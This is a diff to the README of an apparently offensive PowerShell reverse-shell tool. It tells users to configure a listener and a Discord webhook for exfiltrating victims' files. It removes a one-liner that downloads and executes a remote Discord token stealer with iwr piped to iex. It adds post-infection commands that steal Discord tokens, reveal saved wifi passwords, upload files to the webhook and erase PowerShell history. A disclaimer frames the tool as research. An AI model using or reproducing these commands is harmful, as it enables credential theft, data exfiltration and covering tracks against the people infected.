@@ -16,11 +16,19 @@ $ run
 ```
 
 2. Insert the IP address and Port of your listener into the ReverseShell.txt file
+3. Insert discord webhook for exfiltrating files to such in the ReverseShell.txt
+   - use a url shortener for fast execution. 
 
 # Disclaimer
 I am not responsible for the usage of this utility, it is simply for researching and experimentation for myself. The user, YOU take full responsibility for your actions.
 
 # Have fun!
-• Additional payloads after infection
-  - Discord Token Stealer
-    (iwr https://raw.githubusercontent.com/CharlesTheGreat77/token2Discord/main/Testing.txt).Content | iex
+• Additional commands after infection
+  /tgrizzly
+  - exfiltrates discord tokens and saves them to C:\temp\output.txt
+  /wifi
+  - shows saved wifi passwords
+  /discord <filename>
+  - send the file to your discord webhook
+  /clean
+  - removes powershell history
